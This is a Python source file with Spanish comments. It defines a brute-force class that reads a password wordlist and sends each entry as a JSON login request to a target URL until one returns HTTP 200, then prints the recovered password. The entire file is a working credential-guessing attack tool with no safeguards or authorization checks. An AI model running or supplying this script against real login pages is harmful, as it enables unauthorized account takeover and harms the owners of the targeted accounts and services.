import requests

class HTTPBruteForcer:
    def __init__(self, login_url, username, wordlist_path=""):
        self.login_url = login_url
        self.username = username
        self.wordlist_path = wordlist_path
        self.found_password = None

    def _read_wordlist(self):
        """Lee el archivo de contraseñas."""
        try:
            with open(self.wordlist_path, "r", encoding="latin-1") as f:
                return [line.strip() for line in f]
        except FileNotFoundError:
            print(f"[-] Error: No se encontró el archivo {self.wordlist_path}")
            return []

    def _try_password(self, password):
        """Intenta autenticarse con una contraseña."""
        try:
            data = {"email": self.username, "password": password}
            headers = {
                "Content-Type": "application/json",
            }
            
            response = requests.post(self.login_url, json=data, headers=headers )
            
            return response.status_code == 200
        except requests.RequestException:
            return False

    def brute_force(self):
        """Ejecuta el ataque de fuerza bruta (sin paralelismo)."""
        passwords = self._read_wordlist()
        if not passwords:
            return

        print(f"[*] Probando {len(passwords)} contraseñas...")
        for password in passwords:
            print(f"Probando: {password}", end="\r")
            if self._try_password(password):
                self.found_password = password
                print(f"\n[+] ¡Contraseña encontrada!: {password}")
                return

        print("\n[-] Contraseña no encontrada.")
